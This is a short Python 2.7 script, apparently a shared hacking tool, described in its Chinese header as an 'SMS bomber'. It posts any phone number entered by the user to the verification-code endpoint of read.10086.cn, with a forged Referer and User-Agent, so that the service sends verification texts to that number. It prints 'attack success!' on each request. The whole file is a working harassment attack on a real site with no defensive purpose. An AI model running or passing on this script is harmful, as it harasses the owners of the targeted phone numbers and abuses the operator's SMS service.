# -*- coding: utf-8 -*-
#------------------------------
#   python2.7
#   author:loster
#   version:0.1
#   description:向http://read.10086.cn网站post数据，给任意手机号码发送验证短信，进行短信轰炸
#                但是每天对同一手机号有条数限制
#---------------------------------
import httplib,urllib,sys,os,re,urllib2
import string


def attack(phone):
    datas=""
    #post网址
    #url='http://read.10086.cn/u/getValidateCode.action?'
    url='http://read.10086.cn/u/getValidateCode.action?'
    #参数
    payload={'phone':phone,
             'sf':'0'}
    # 不能没有Referer
    i_headers = {"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1) Gecko/20090624 Firefox/3.5",  
                  "Accept": "text/plain",'Referer':'http://read.10086.com/u/www/'} 
    payload=urllib.urlencode(payload)
   
    try:
        request=urllib2.Request(url,payload,i_headers)
        response=urllib2.urlopen(request)
        datas=response.read()
        print datas
        print 'attack success!'
    except:
        print "attack failed!!!" 
 
if __name__=="__main__":
    phone=raw_input('input the phone:')
    attack(phone)
